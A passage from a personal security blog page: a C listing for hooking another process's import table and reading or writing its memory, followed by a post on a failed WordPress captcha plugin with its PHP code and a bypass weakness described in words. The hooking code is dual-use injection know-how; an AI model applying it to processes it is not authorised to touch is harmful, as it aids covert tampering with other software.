        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Handler written to address 0x%x!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pHandler</span><span class="p">);</span>


    <span class="cm">/* Patch the IAT with a pointer to the handler */</span>
    <span class="n">pHookContext</span><span class="o">-&gt;</span><span class="n">oldFuncPointer</span> <span class="o">=</span> <span class="n">PatchIAT</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">imageImportDirectory</span><span class="p">,</span>
        <span class="p">(</span><span class="n">DWORD</span><span class="p">)((</span><span class="n">PPEB</span><span class="p">)</span><span class="n">pPEP</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ImageBaseAddress</span><span class="p">,</span>
        <span class="n">libName</span><span class="p">,</span>
        <span class="n">funcName</span><span class="p">,</span>
        <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pHandler</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pHookContext</span><span class="o">-&gt;</span><span class="n">oldFuncPointer</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] The specified API %s couldn&#39;t be located in the IAT</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">funcName</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* The hook should be sharp by now :) */</span>

    <span class="c1">//pHookContext-&gt;pOldFuncPointer =</span>

    <span class="k">return</span> <span class="n">pHookContext</span><span class="p">;</span>
<span class="p">}</span>


<span class="n">BOOL</span>
<span class="nf">ReleaseHook</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">HOOK_CONTEXT</span> <span class="o">*</span><span class="n">pHookContext</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">BOOL</span> <span class="n">bSuccess</span><span class="p">;</span>

<span class="p">}</span>

<span class="cm">/* </span>
<span class="cm"> * Caller has to pass a pointer. Caller  has to free() then the mem allocated here</span>
<span class="cm"> * buf is a pointer to a pointer. Otherwise we loose the mem. This is C magic... :/ </span>
<span class="cm"> */</span>
<span class="c1">// =============================================================================================</span>
<span class="n">BOOL</span>
<span class="nf">RetReadProcessMemory</span><span class="p">(</span><span class="n">OUT</span> <span class="n">PCHAR</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">sizeBuf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">BOOL</span> <span class="n">bSuccess</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span><span class="p">,</span> <span class="n">dummy</span><span class="p">;</span>
    <span class="n">SIZE_T</span> <span class="n">numBytesRead</span><span class="p">;</span>


    <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">sizeBuf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CHAR</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;calloc() in RetReadProcessMemory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mh">0x666</span><span class="p">;</span> <span class="c1">// Little hack here</span>
    <span class="p">}</span>

    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpBaseAddress</span><span class="p">,</span>
        <span class="n">sizeBuf</span><span class="p">,</span>
        <span class="n">PAGE_READONLY</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">oldProtect</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;VirtualProtectEx() in RetReadProcessMemory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Read finally the process memory */</span>
    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">ReadProcessMemory</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpBaseAddress</span><span class="p">,</span>
        <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
        <span class="n">sizeBuf</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">numBytesRead</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;ReadProcessMemory() in RetReadProcessMemory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Restore old memory protection constants */</span>
    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpBaseAddress</span><span class="p">,</span>
        <span class="n">sizeBuf</span><span class="p">,</span>
        <span class="n">oldProtect</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">dummy</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;VirtualProtectEx(RESTORING) in RetReadProcessMemory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="n">BOOL</span>
<span class="nf">RetWriteProcessMemory</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">nSize</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">BOOL</span> <span class="n">bSuccess</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span><span class="p">,</span> <span class="n">dummy</span><span class="p">;</span>
    <span class="n">SIZE_T</span> <span class="n">numBytesWritten</span><span class="p">;</span>

    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpBaseAddress</span><span class="p">,</span>
        <span class="n">nSize</span><span class="p">,</span>
        <span class="n">PAGE_READWRITE</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">oldProtect</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;VirtualProtectEx() in RetWriteProcessMemory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpBaseAddress</span><span class="p">,</span>
        <span class="n">lpBuffer</span><span class="p">,</span>
        <span class="n">nSize</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">numBytesWritten</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;WriteProcessMemory in WriteProcessMemory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Restore old memory protection constants */</span>
    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpBaseAddress</span><span class="p">,</span>
        <span class="n">nSize</span><span class="p">,</span>
        <span class="n">oldProtect</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">dummy</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;VirtualProtectEx(RESTORING) in RetReadProcessMemory() failed with  %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/the-dangers-of-a-badly-planned-project.html#the-dangers-of-a-badly-planned-project">The dangers of a poorly planned project</a></h2>
    <p>
      Posted on Do 21 November 2013 in <a href="/category/philosophical.html">Philosophical</a>
      &#8226; Tagged with
      <a href="/tag/architecture.html">Architecture</a>,      <a href="/tag/captcha.html">Captcha</a>,      <a href="/tag/philosophical.html">Philosophical</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/php.html">Php</a>,      <a href="/tag/uncategorized.html">Uncategorized</a>,      <a href="/tag/wordpress.html">Wordpress</a>    </p>
  </header>
  <div>
      <h3>Preface</h3>
<p>Do you like to fiddle around with programming projects in your spare
time? And do you sometimes start endeavors ambitiously, but you never
actually finish them? Are you fucking tired of stacking unsuccessful
projects, doing mediocre work while never being thoroughly satisfied in
what you do?</p>
<p>If yes, you may be inclined to listen to some words I have to say over
my most recent failed project:</p>
<p>The idea was to create my own <em>little</em> captcha plugin for wordpress. You
can learn more about the idea by delving into some of my accompanying
investigations in the following blog posts:</p>
<ul>
<li><a href="http://incolumitas.com/2013/10/06/plotting-bezier-curves/">Plotting Bzier curves directly and with De Casteljaus
    algorithm</a></li>
<li><a href="http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/">Create your own font the hard
    way!</a></li>
</ul>
<p>Honestly I started this project because back in the time I was using
<a href="wordpress.org/plugins/captcha/" title="captcha">this</a> plugin and I was
unsatisfied because for
<a href="http://incolumitas.com/2013/11/04/a-tale-of-a-twofold-broken-wordpress-captcha-plugin/" title="captcha is broken">these</a>
reason. So this context information hopefully points out some of my
motivations to start the project in the first place.</p>
<h3>The destiny of every badly planned project</h3>
<p>As with many spontaneously started projects in came up with in the past,
I first was convinced that it was an awesome idea and subsequently
started programming head-first without having a clear path or at least a
slight vision of what the project should look like in the end.</p>
<p>But after reaching first milestones, it slowly began to dawn on me that
there might be several issues inherent to the architecture and concept
itself. This kind of coming back down to earth with a bang is nothing
new for me, actually it's a pattern I observed several times in the
past.</p>
<p>It's really annoying, because you invested blood, sweat and tears into
your project. Let me analyze how such a idea get's wrecked over its
unfortunate evolution:</p>
<h3>Avoid quickstarts</h3>
<p>The first development stage of a fresh project is mostly euphorically:
You're able to make progress virtually without making big efforts. You
just code thoughtlessly without having the big picture in front of you.<br />
The reason for that is, that your motivation is intrinsic and you don't
have to convince yourself that what you are doing is right; you're just
doing it.<br />
In this phase, you're unconsciously laying the foundation of your
project (Defining classes, choosing a concrete design pattern) and the
quality and solidness of what you do <em>now</em> determines the amount of
headache and time you have to invest <em>later</em> to fix architectural
mistakes.<br />
<strong>Learn:</strong> Before you begin to write a single line of code, make sure
that you can answer the following questions: Am I implementing something
that I will actively user later, or am I just doing it for the learning
sake? Is the end product important, or the path itself?</p>
<h3>Use existing solutions</h3>
<p>If you are like me, then you love to do reinvent things: Rasterizing
Bzier curves? Plotting Lines? Writing PNG's (Involves the whole
re-implementation of the pretty complex PNG specification)? Should I use
ImageMagick? Nahh, let's not use a imaging library, let's do it on my
own!<br />
The avoidance of a imaging library is a concrete example and a part of
the reason for the failure of my aforementioned project idea.<br />
Reinventing and re-implementing essential building blocks is mostly a
bad idea!<br />
Don't get me wrong: Doing so is highly educational and in the process
you're going to learn a hell of a lot (Example: How else would I know
now how to approximate the derivation of n-th order bezier curves
numerically with the Newton-Raphson algorithm?).<br />
But if you create elemental code on your own, you should either have
professional knowledge of the subject or a huge willpower/effort and
most importantly, lots of time on your hand, to invest into your
endeavor.</p>
<p><strong>Understand:</strong> Ask yourself whether you want to focus on the unique,
innovative part of your application, that needs to absorb all of your
imagination and creativity, or if you prefer spending a lot of time on
parts that already exist in a better form than you would ever be able to
do it?<br />
It's mostly a rhetorical question, but the paradoxical part lies here:
If you never appreciate the thinking process that accommodates the
building process of a elemental software block and you always do the
part that's completely new, you mightn't learn <em>enough</em> to do actually a
worthy, unique and new part. The road to a brilliant idea is paved by
many failures and dull re-implementations of existing ideas!</p>
<h3>Do not bury your aborted ideas.</h3>
<p>It's bad, believe me.<br />
You don't need to pursue a project at all costs even though it was
doomed to fail right from the beginning. But if you try to forget it and
let your code rot in some shady places on your hard-drive, you're
unconsciously reinforcing a very bad feeling: That you still have
something to complete, but you do not really know what.<br />
Make a clear decision to finish your project. Just mark it as completed
and as a failure, but put an end to it! This allows you to start over
and do better in the future! Not everything needs to be a success. Most
projects end as a failure. Such is life!</p>
<h3>Rethinking about motivation and discipline</h3>
<p>In being fully aware of the danger of sounding corny (Does this word fit
here?): You only need to be right very few times in life:</p>
<ul>
<li>Theoretically, you need to command up the courage only once to find
    the woman of your life.</li>
<li>You only need to try very few times in your life to apply for a job
    of your dreams.</li>
<li>Once realized that Python is the very best programming language (In
    combination with C) you don't need wasting your precious time on
    other languages anymore ;)</li>
</ul>
<p>You can endure thousand failures, but if you just succeed once with an
idea, you made it.<br />
If there's a single project that doesn't end in the corner of failures,
you succeeded! So every stranding you encounter in life brings you
closer to a success. The worst thing you can do: Stop trying.<br />
I honestly don't think that this is motivational nonsense: Try hard
enough, end you eventually succeed. As simple as that.<br />
<strong>Learn:</strong> Be aware of motivation. Everybody is motivated. Anyone wants
to get in formidable physical shape, learn a lot and achieve great
things. But only few to so. It's not a question of intellectual ability
and fluid intelligence that keeps you from reaching mastery, it's the
addiction of being comfortable and shirking, that makes it impossible
for you to do what you want.<br />
Ask yourself: Who will rise higher: A committed, hard working,
averagely gifted person, that spends a year on a particular task, or a
genius that expects from himself to do great things in a short time?</p>
<h3>Getting concrete: What was wrong with my idea? And what did I actually learn?</h3>
<p>The initial idea was to make a (nother) Captcha plugin for Wordpress.</p>
<p>Maybe the first mistake was to consider doing my own version, without
even inspecting the existing solutions.<br />
But there are quite some good wordpress captcha plugins out there. For
instance the one I am using now: It prevents all forms of spam so far
and fulfills its purpose perfectly.<br />
That's all you expect from such a plugin.<br />
A <a href="http://wordpress.org/plugins/search.php?q=captcha" title="captcha alternatives">quick
search</a>
yields many good alternatives that I wasn't aware of.</p>
<p>Furthermore, I wanted to to everything on my own: Rasterizing my own
lines (Bresenham line algorithm, Midpoint algorithm), plotting Bzier
splines on my own (Casteljau's algorithm, several different
approximations, ...), generating bitmap graphics on my own and I could
continue this list indefinitely.</p>
<p>All these patchwork approaches ended in a very unstable captcha
implementation on witch I couldn't built further. This meant, that every
future I tried to integrate, needed exhaustive debugging while
maintaining an general overview of where the bug could be possibly
situated.</p>
<p>To state an example: I tried to implement glyph filling. This involves
line/line and line/curve intersection checking. The algorithm that finds
the intersection point needs the roots of Bzier curves (Which were
cubic in my case).<br />
Thus I had to implement the Raphson-Newton algorithm in order to
compute the roots. That alone was a new field for me. But combined with
my repulsion for PHP and a really unstable testing environment (I could
have made a better debugging environment, but apparently I was to lazy),
it was a pain in the ass to implement things correctly.</p>
<p>I soon started to solve the problems in Python and after the logic was
working there, ported it back to PHP. I did so simply out of the reason
that debugging the plugin directly, involved generating bitmap captchas
every run, which was a rather tedious process. Hence I underestimated
the complexity completely and failed to set up a productive environment
(I better don't start elaborating on my attempts to get xdebug installed
in a xampp environment).</p>
<p>While the former issue wasn't the reason I decided to stop the
development, there were other problems with the architecture itself:</p>
<p>My captcha plugin calculates randomly placed splines and glyphs on a
bitmap (that constitute the glyphs) and saves the rather large (no
compression) netbpm bitmap file on disk, which is then converted to a
PNG with the command line utility pnmtopng.  </p>
<p>All this requires a lot memory and CPU power, since the algorithms to
rasterize lines and Bzier splines are rather expensive. Therefore I
just fire the captcha factory once in intervals of 2 hours (With web
cronjobs or real cronjobs if necessary) in order to feed a finite pool
of captcha images, that's is slowly but constantly renewing itself.<br />
All users that visit the plugin, get a randomly chosen captchas served.
But this approach exhibits a big drawback: The captcha exists to prevent
spammers from posting comments. But due to this captcha-image-pool
design, every malicious user could just request a large amount of
captchas until he obtains the majority of captchas in the pool. Then he
could manually map the obtained pictures to it's solution and teach his
attacking script the answer and BOOM the captcha is bypassed.<br />
Of course he'd need to update the mappings every two hours, but this
wouldn't hinder a motivated attacker to do so.</p>
<p>In short: Because plotting bitmaps and computing splines is a very
expensive task, I simply can't manufacture fresh captchas for every
user. I need to have a collection of pre built captcha pictures that are
randomly chosen to be presented to visitors. But this is a weak design
from a security point of view.<br />
Although there are countermeasures, they cannot neutralize the root
problem and hinder evil mind's from finding a circumvention.</p>
<p>Here have an example of how I implemented that "pool feeding":</p>
<div class="highlight"><pre><span class="x">/*</span>
<span class="x"> * Only the cronjob calls this file directly. The cronjob must have the same</span>
<span class="x"> * IP address as the webserver, otherwise it won&#39;t be executed. This prevents</span>
<span class="x"> * users from calling this file directly and DDOSing the server</span>
<span class="x"> */</span>
<span class="x">if (basename(__FILE__) == basename($_SERVER[&quot;SCRIPT_FILENAME&quot;])) {</span>
<span class="x">    if (in_array($_SERVER[&#39;REMOTE_ADDR&#39;], array(&#39;127.0.0.1&#39;, &#39;::1&#39;))) {</span>
<span class="x">        require_once(&#39;cunning_captcha_lib.php&#39;);</span>
<span class="x">        /* Bring the wordpress API into play */</span>
<span class="x">        define(&#39;WP_USE_THEMES&#39;, false);</span>
<span class="x">        require(&#39;../../../wp-blog-header.php&#39;); /* Assuming we&#39;re in plugin directory */</span>
<span class="x">        ccaptcha_feed_pool(); /* Feed the little monster */</span>
<span class="x">    } else {</span>
<span class="x">        wp_die(__(&#39;Error: Dont call CunningCaptcha directly. It does not like it :(.&#39;, &#39;CunningCaptcha&#39;));</span>
<span class="x">    }</span>
<span class="x">}</span>

<span class="x">// ...</span>
<span class="x">/*</span>
<span class="x"> * Adds new captcha images to the pool.</span>
<span class="x"> */</span>

<span class="x">function ccaptcha_feed_pool() {</span>
<span class="x">    /* First of all check if pnmtopng is available on the system */</span>

<span class="x">    $handle = popen(&#39;/usr/bin/which pnmtopng 2&gt;&amp;1&#39;, &#39;r&#39;);</span>
<span class="x">    $read = fread($handle, 2096);</span>
<span class="x">    pclose($handle);</span>
<span class="x">    if (!file_exists(trim($read))) {</span>
<span class="x">        print(&quot;pnmtopng is not installed on the system.&quot;);</span>
<span class="x">        return false;</span>
<span class="x">    }</span>

<span class="x">    /* Check if target dir exists, if not, create it */</span>
<span class="x">    if (!file_exists(trailingslashit(TARGET_DIR)) &amp;&amp; !is_dir(trailingslashit(TARGET_DIR))) {</span>
<span class="x">        if (!mkdir(trailingslashit(TARGET_DIR), $mode = 0755))</span>
<span class="x">            print(&quot;Couldn&#39;t create image directory&quot;);</span>
<span class="x">        return false;</span>
<span class="x">    }</span>

<span class="x">    /* If there are no png files in the target directory, unset the option */</span>
<span class="x">    if (false === strpos(implode(&#39;&#39;, array_values(scandir(trailingslashit(TARGET_DIR)))), &#39;png&#39;)) {</span>
<span class="x">        echo &quot;deleted options&quot;;</span>
<span class="x">        delete_option(&#39;ccaptcha_path_captcha_a&#39;);</span>
<span class="x">    }</span>

<span class="x">    $captchas = cclib_generateCaptchas($path = trailingslashit(TARGET_DIR), $number = 10, $captchalength = 5);</span>

<span class="x">    /* Convert them to png using pnmtopng */</span>
<span class="x">    foreach (array_keys($captchas) as $path) {</span>
<span class="x">        $path = escapeshellarg($path);</span>
<span class="x">        system(sprintf(&quot;pnmtopng %s &gt; %s &amp;&amp; rm %s;&quot;, $path . &#39;.ppm&#39;, $path . &#39;.png&#39;, $path . &#39;.ppm&#39;));</span>
<span class="x">    }</span>
<span class="x">    /*</span>
<span class="x">     * If the pool size is now too large, delete the superfluous (redundant) files from the directory</span>
<span class="x">     * and the options database.</span>
<span class="x">     */</span>
<span class="x">    $cnt = 0;</span>
<span class="x">    foreach (glob(trailingslashit(TARGET_DIR) . &quot;*.png&quot;) as $filename) {</span>
<span class="x">        $filetimes[$filename] = filectime($filename);</span>
<span class="x">        $cnt++;</span>
<span class="x">    }</span>

<span class="x">    if ($cnt &gt; POOL_SIZE) {</span>
<span class="x">        $num_to_delete = $cnt - POOL_SIZE;</span>
<span class="x">        /* Sort the array by value (unix timestamp) */</span>
<span class="x">        if (!asort($filetimes, SORT_NUMERIC)) {</span>
<span class="x">            print(&quot;couldn&#39;t sort images by modification time.&quot;);</span>
<span class="x">            return false;</span>
<span class="x">        }</span>
<span class="x">        $keys = array_keys($filetimes);</span>
<span class="x">        $savedcaptchas = get_option(&#39;ccaptcha_path_captcha_a&#39;); /* This array cannot (should&#39;t) be empty */</span>
<span class="x">        foreach (range(0, $num_to_delete - 1) as $i) {</span>
<span class="x">            unlink($keys[$i]);</span>
<span class="x">            unset($savedcaptchas[rtrim($keys[$i], &#39;.png&#39;)]);</span>
<span class="x">        }</span>
<span class="x">        /* Synchronize the deletions with the options database */</span>
<span class="x">        if (false === update_option(&#39;ccaptcha_path_captcha_a&#39;, $savedcaptchas)) {</span>
<span class="x">            /* update failed or the option didn&#39;t change */</span>
<span class="x">        }</span>
<span class="x">    }</span>

<span class="x">    $savedcaptchas = get_option(&#39;ccaptcha_path_captcha_a&#39;);</span>

<span class="x">    if (!$savedcaptchas) // Create</span>
<span class="x">        update_option(&#39;ccaptcha_path_captcha_a&#39;, $captchas);</span>
<span class="x">    else { // Add</span>
<span class="x">        update_option(&#39;ccaptcha_path_captcha_a&#39;, array_merge($savedcaptchas, $captchas));</span>
<span class="x">    }</span>

<span class="x">    /* Check if the directory and the options database are synchronized */</span>
<span class="x">    $a = get_option(&#39;ccaptcha_path_captcha_a&#39;);</span>
<span class="x">    foreach (array_keys($a) as $key)</span>
<span class="x">        if (!file_exists($key . &#39;.png&#39;))</span>
<span class="x">            wp_die(&quot;Options database doesn&#39;t match with FS&quot;);</span>

<span class="x">    D($a);</span>

<span class="x">    return true;</span>
<span class="x">}</span>
</pre></div>


<h3>What now?</h3>
<p>It's not all bad. The plugin that I see as a failure is even working.
The estimated amount of 3000 lines of code (including python sources)
wasn't for nothing. You can dig it on <a href="https://github.com/NikolaiT/CunningCaptcha">my github
account</a> if you like. I
learned a lot and I have come up with another idea that is better (I
need to watch out that I don't fall in the same mistakes I pointed out
above). But before I begin with the new idea, I will profoundly think
about it! You can be damn sure of that!</p>
<h3>Epilogue</h3>
<p>To conclude this post about my failed attempt, let's actually show how
the plugin works in it's current unfinished form. Let me repeat: It
works. It's a rather bad captcha (Would be easy to crack with OCR), but
one could use it in wordpress.</p>
<p>Here are some captchas generated in distinct forms:</p>
<p>[<img alt="The captcha in the comment form. Note: The error message reveals that I was
pretty frustrated while coding
:D" src="/uploads/2013/11/captcha_in_action2.png" /></p>
<p>[<img alt="The captcha embedded in the comment
form..." src="/uploads/2013/11/captcha_in_action1-300x300.png" /></p>
<p>Let me know what you think...</p>
<p>Cheers</p>
  </div>
</article>

  <div class="pagination">
    <a class="btn" href="/index4.html">
      <i class="fa fa-angle-left"></i> Older Posts
    </a>
      <a class="btn float-right" href="/index2.html">
        Newer Posts <i class="fa fa-angle-right"></i>
      </a>
  </div>

    <footer>
      <p>&copy; Nikolai Tschacher 2015</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p>    </footer>
  </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Coding, Learning and IT Security ",
  "url" : "",
  "image": "",
  "description": "Nikolai Tschacher's ideas and programming around security and computer science"
}
</script></body>
</html>